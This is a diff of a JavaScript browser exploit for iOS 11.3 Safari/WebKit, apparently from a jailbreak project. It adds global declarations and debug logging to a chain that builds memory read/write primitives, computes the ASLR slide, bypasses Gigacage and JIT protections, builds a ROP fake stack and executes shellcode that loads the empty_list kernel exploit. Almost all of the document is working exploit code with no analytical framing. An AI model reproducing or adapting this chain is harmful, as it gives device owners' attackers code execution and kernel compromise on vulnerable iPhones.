@@ -8,16 +8,66 @@
  *		By Niklas B.
  */
 
-module('verbosity');
-include('sploit.1131.h');
+using('verbosity');
+_off = {};
+TEN = 10;
+HUNDRED = 100;
+THOUSAND = 1000;
+ITERS = TEN*THOUSAND;
+ALLOCS = THOUSAND;
+conversion_buffer = new ArrayBuffer(8);
+f64 = new Float64Array(conversion_buffer);
+i32 = new Uint32Array(conversion_buffer);
+BASE32 = 0x100000000;
+counter = 0;
+workbuf = new ArrayBuffer(0x1000000)
+u32_buffer = new Uint32Array(workbuf);
+u8_buffer = new Uint8Array(workbuf);
+shellcode_length = 0;
+structure_spray = [];
+manager = null;
+unboxed_size = 100;
+unboxed = null;
+boxed = null;
+victim = {};
+outer = {};
+fake_addr = 0;
+unboxed_addr = 0;
+boxed_addr = 0;
+victim_addr = 0;
+holder = {};
+shared_butterfly = 0;
+boxed_butterfly = 0;
+victim_butterfly = 0;
+stage1 = {};
+stage2 = {};
+wrapper = null;
+wrapper_addr = 0;
+el_addr = 0;
+vtab_addr = 0;
+slide = 0;
+disablePrimitiveGigacage = 0;
+callbacks = 0;
+g_gigacageBasePtrs = 0;
+g_typedArrayPoisons = 0;
+longjmp = 0;
+dlsym = 0;
+startOfFixedExecutableMemoryPool = 0;
+endOfFixedExecutableMemoryPool = 0;
+jitWriteSeparateHeapsFunction = 0;
+useFastPermisionsJITCopy = 0;
+ptr_stack_check_guard = 0;
+pop_x8 = 0;
+pop_x2 = 0;
+linkcode_gadget = 0;
+callback_vector = 0;
+poison = 0;
+buffer_addr = 0;
+shellcode_src = 0;
+shellcode_dst = 0;
+fake_stack = [];
 
 
-//Offset detection
-function has_offsets() {
-    if(!window.chosendevice) return false;
-    if(!window.chosendevice.offsets) return false;
-    return true;
-}
 
 //Hex conversion
 function hex(x) {
@@ -80,11 +130,11 @@ function trigger(constr, modify, res, val) {
 
 //The exploit
 var pwn = function() {
-    var _off = window.chosendevice.offsets;
+    _off = window.chosendevice.offsets;
     console.log('Starting stage 1...');
     
     stage1 = {
-        addroff: function(victim) {
+        addrof: function(victim) {
             return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim));
         },
         
@@ -193,7 +243,7 @@ var pwn = function() {
         holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
     }
     
-    console.log('stage 1 complete, moving to stage 2.');
+    print('stage 1 complete, moving to stage 2.');
     
     //Alright, this is where we get full r/w to memory
     stage2 = {
@@ -253,18 +303,45 @@ var pwn = function() {
     el_addr = stage2.read64(wrapper_addr + _off.padding);
     vtab_addr = stage2.read64(el_addr);
     
+
+    print("Lets hope our offsets are correct as we will now use them.");
+
     //now get the ASLR slide
     slide = stage2.read64(vtab_addr) - _off.vtable;
+
+    if(verbosity >= VERBOSITY_HIGH) print('ASLR slide: '+hex(slide));
+
     disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
+
+    if(verbosity >= VERBOSITY_HIGH) print('disablePrimitiveGigacage is at: '+hex(_off.disableprimitivegigacage+slide));
+
     callbacks = _off.callbacks + slide;
+
+    if(verbosity >= VERBOSITY_HIGH) print('callbacks is at: '+hex(_off.callbacks+slide));
+
     g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
-    g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
+
+    if(verbosity >= VERBOSITY_HIGH) print('g_gigacageBasePtrs is at: '+hex(_off.g_gigacagebaseptrs+slide));
+
+    g_typedArrayPoisons = _off.g_typedArrayPoisons + slide;
+
+    if(verbosity >= VERBOSITY_HIGH) print('g_typedArrayPoisons is at: '+hex(_off.g_typedArrayPoisons+slide));
+
     longjmp = _off.longjmp + slide;
+
+    if(verbosity >= VERBOSITY_HIGH) print('longjmp is at: '+hex(_off.longjmp+slide));
+
     dlsym = _off.dlsym + slide;
-    startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide)
-    endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide)
-    jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide)
-    useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide)
+
+    if(verbosity >= VERBOSITY_HIGH) print('dlsym is at: '+hex(_off.dlsym+slide));
+
+    if(verbosity >= VERBOSITY_HIGH) print('Reading JIT stuff....');
+    
+    startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
+    endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
+    jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide);
+    useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide);
+    
     ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
     pop_x8 = _off.modelio_popx8 + slide;
     pop_x2 = _off.coreaudio_popx2 + slide;
@@ -280,12 +357,15 @@ var pwn = function() {
               + '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy));
     }
 
+
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
         // Probably an older phone, should be even easier
         fail(3);
     }
     
+    print("Setting up shellcode in memory...");
+
     //Now set up our shellcode for code execution
     callback_vector = stage2.read64(callbacks);
 
@@ -296,6 +376,7 @@ var pwn = function() {
     shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
     stage2.write64(shellcode_src + 4, dlsym);
               
+    print("Setting up fake stack...");
     //set up our fake executable stack
     fake_stack = [
         0,
@@ -326,7 +407,9 @@ var pwn = function() {
           u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
     }
     
-    //lets set up our code exection of the dylib payload
+    print("Setting up code execution...");
+
+    //lets set up our code execution of the dylib payload
     stage2.write_non_zero(el_addr, [
         buffer_addr, // fake vtable
         0,
@@ -339,15 +422,12 @@ var pwn = function() {
         buffer_addr + 0x2000, // sp
     ]);
     print('shellcode is at ' + hex(shellcode_dst));
-    print('For best results close all apps except for safari before dismissing the next alert!');
+    print('Next we will start empty_list, the kernel may panic, for best results close all apps except for safari before dismissing the next alert!');
     wrapper.addEventListener('click', function(){}); //execute the shellcode
 };
 
 //The exploit initialization 
 var wk113go = function() {
-    
-    //we really need offsets first
-    if(!has_offsets()) return fail(-1);
     
     //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
     fetch('payloads/11_3_1/emptylist.bin').then((response) => {
